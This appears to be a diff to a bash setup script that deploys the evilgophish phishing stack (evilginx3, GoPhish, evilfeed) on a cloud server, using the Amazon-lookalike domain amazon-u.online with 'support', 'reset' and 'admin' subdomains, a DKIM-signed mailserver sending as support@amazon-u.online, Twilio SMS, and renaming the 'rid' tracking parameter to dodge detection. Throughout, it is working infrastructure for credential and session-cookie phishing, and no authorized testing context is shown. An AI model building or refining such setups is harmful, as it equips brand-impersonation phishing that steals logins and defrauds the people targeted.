@@ -1,8 +1,8 @@
 #!/bin/bash
 # setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain amazon-u.online; Turnstile optional; separate repos for evilginx3, gophish, evilfeed; .env.example; validates gophish.go; fixes mailconfig.
+# Changes: Domain amazon-u.online; Turnstile optional; separate repos for evilginx3, gophish, evilfeed; .env.example; validates gophish.go; makes evilfeed optional; fixes mailconfig.
 # SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
-# Fixes: Checks src/gophish/gophish.go; retries DKIM with longer delay.
+# Fixes: Checks src/gophish/gophish.go; retries DKIM with debug; skips evilfeed if main.go missing; clarifies RID_REPLACEMENT.
 # Usage: ./setup.sh
 # Best Practices:
 # - Edit .env.example before running; backup configs; secure secrets.
@@ -20,7 +20,7 @@ DOMAIN=amazon-u.online
 SUBDOMAINS=support,email,reset,admin
 PROXY_ROOT=true
 FEED_ENABLED=true
-RID_REPLACEMENT=user_id
+RID_REPLACEMENT=user_id  # URL parameter for tracking users (e.g., ?user_id=abc123); change to 'id', 'token', etc. if needed
 TWILIO_ACCOUNT_SID=your_twilio_account_sid
 TWILIO_AUTH_TOKEN=your_twilio_auth_token
 TWILIO_PHONE=+15551234567
@@ -37,7 +37,7 @@ fi
 # Copy .env.example to .env if .env doesn't exist
 if [ ! -f .env ]; then
   cp .env.example .env
-  echo "Created .env from .env.example. Edit .env with your credentials and rerun."
+  echo "Created .env from .env.example. Edit .env with your credentials (TWILIO_*, SMTP_PASS, optionally RID_REPLACEMENT) and rerun."
   exit 1
 fi
 
@@ -51,6 +51,7 @@ set +a
 [ -z "$TWILIO_ACCOUNT_SID" ] && { echo "Error: TWILIO_ACCOUNT_SID required in .env"; exit 1; }
 [ -z "$TWILIO_AUTH_TOKEN" ] && { echo "Error: TWILIO_AUTH_TOKEN required in .env"; exit 1; }
 [ -z "$TWILIO_PHONE" ] && { echo "Error: TWILIO_PHONE required in .env"; exit 1; }
+[ -z "$RID_REPLACEMENT" ] && { echo "Error: RID_REPLACEMENT required in .env (e.g., user_id, id, token)"; exit 1; }
 
 # Dirs/Files
 mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./Uploads ./logs ./mailconfig
@@ -124,7 +125,12 @@ if ! git clone https://github.com/fin3ss3g0d/evilgophish.git /tmp/evilgophish; t
   echo "Error: Failed to clone evilgophish for evilfeed. Check network or repo access."
   exit 1
 fi
-cp -r /tmp/evilgophish/evilfeed src/evilfeed || echo "Warning: evilfeed not found in evilgophish; may need manual setup."
+if [ -d "/tmp/evilgophish/evilfeed" ]; then
+  cp -r /tmp/evilgophish/evilfeed src/evilfeed
+else
+  echo "Warning: evilfeed directory not found in evilgophish; skipping evilfeed setup."
+fi
+rm -rf /tmp/evilgophish
 
 # Validate repositories
 for dir in evilginx3 gophish; do
@@ -135,13 +141,16 @@ for dir in evilginx3 gophish; do
     [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
   fi
 done
-[ ! -d "src/evilfeed" ] || [ ! -f "src/evilfeed/main.go" ] && echo "Warning: src/evilfeed or main.go missing; evilfeed may not build."
+if [ -d "src/evilfeed" ] && [ ! -f "src/evilfeed/main.go" ]; then
+  echo "Warning: src/evilfeed/main.go missing; evilfeed will not build."
+fi
 
 # Fix permissions
 sudo chown -R $(whoami):$(whoami) src
 chmod -R 755 src
 
 # RID replacement
+echo "Replacing 'rid' with '$RID_REPLACEMENT' in source files..."
 cd src
 find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec cp {} {}.bak \;
 find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec sed -i "s/rid/${RID_REPLACEMENT}/g" {} \;
@@ -154,7 +163,7 @@ EOF
 
 # Dockerfiles
 cat > Dockerfile.gophish << 'EOF'
-FROM golang:1.21-alpine AS builder
+FROM golang:1.23-alpine AS builder
 RUN apk add --no-cache git
 WORKDIR /src
 COPY src/gophish .
@@ -170,7 +179,7 @@ CMD ["./gophish"]
 EOF
 
 cat > Dockerfile.evilginx << 'EOF'
-FROM golang:1.21-alpine AS builder
+FROM golang:1.23-alpine AS builder
 RUN apk add --no-cache git
 WORKDIR /src
 COPY src/evilginx3 .
@@ -185,7 +194,7 @@ CMD ["./evilginx"]
 EOF
 
 cat > Dockerfile.evilfeed << 'EOF'
-FROM golang:1.21-alpine AS builder
+FROM golang:1.23-alpine AS builder
 RUN apk add --no-cache git
 WORKDIR /src
 COPY src/evilfeed .
@@ -206,27 +215,31 @@ echo "Waiting for mailserver to be ready..."
 sleep 30  # Increased delay for container startup
 for i in {1..3}; do
   if docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"; then
+    echo "Email user $SMTP_USER added successfully."
     break
   else
     echo "Attempt $i: Failed to add email user. Retrying..."
+    docker logs mailserver | tail -n 20
     sleep 5
   fi
 done
 for i in {1..3}; do
   if docker exec -it mailserver setup config dkim; then
+    echo "DKIM generated successfully."
     break
   else
     echo "Attempt $i: Failed to generate DKIM. Retrying..."
+    docker logs mailserver | tail -n 20
     sleep 5
   fi
 done
 echo "DKIM generated. Add this TXT to Lightsail DNS:"
-cat ./mailconfig/opendkim/keys/${DOMAIN}/mail.txt || echo "Error: DKIM not generated. Run: docker exec -it mailserver setup config dkim"
+cat ./mailconfig/opendkim/keys/${DOMAIN}/mail.txt || echo "Error: DKIM not generated. Run: docker exec -it mailserver setup config dkim; docker logs mailserver"
 
 # Post-setup
 echo "Setup complete! Access:"
 echo "- GoPhish Admin: http://localhost:3333 (default admin/gophish)"
-echo "- Live Feed: http://localhost:1337"
+echo "- Live Feed: http://localhost:1337 (if evilfeed built successfully)"
 echo "- Phishing: https://$DOMAIN"
 echo "- SMTP: Use in GoPhish: Host=mail.$DOMAIN:587, User=$SMTP_USER, Pass=****"
 echo "Upload: cp file.csv uploads/; docker cp uploads/file.csv gophish:/app/uploads/"
